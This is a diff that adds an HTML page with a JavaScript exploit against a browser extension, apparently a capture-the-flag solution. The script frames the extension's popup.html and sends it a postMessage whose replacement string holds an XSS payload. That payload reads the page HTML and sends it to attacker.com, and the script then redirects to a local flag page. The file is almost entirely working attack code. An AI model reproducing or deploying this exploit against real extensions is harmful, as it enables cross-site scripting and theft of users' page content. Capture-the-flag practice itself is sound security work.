@@ -1,0 +1,51 @@
+<marquee>Replace me</marquee>
+<script>
+
+    console.log('Exploit running..')
+    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+
+    
+    (async() => {
+        // wait for the extension to replace the image could use mutation observer or something
+        await sleep(2000)
+        // get url of first img
+        let img = document.querySelector('img')
+        if(!img){
+            console.log(`Extension did not replace tag.`)
+        }
+        // create iframe /popup.html
+        let i = document.createElement('iframe')
+        i.src = img.src.replace('no_entry.png', 'popup.html')
+        document.body.appendChild(i)
+
+
+        // await onload 
+        await new Promise(r => i.onload = r)
+
+        // xss payload steals the html of the page and sends it to the attacker
+        let payload = () => {
+            console.log(`Exploit running in ${location.href}`)
+            fetch('/').then(r => r.text()).then(t => {
+                fetch(`http://attacker.com/x?html=${encodeURIComponent(t)}`, {mode:'no-cors'})
+            })
+        }
+
+        
+
+        let html = `<img src="x" onerror="(${payload.toString()})()"></img>`
+
+        i.contentWindow.postMessage({type: 'SET', replacementString: html}, '*')
+
+        await sleep(2000)
+        console.log('Done..')
+        console.log('Goto flag page')
+        
+        location = `http://127.0.0.1:1337`
+
+    })()
+
+
+
+
+</script>
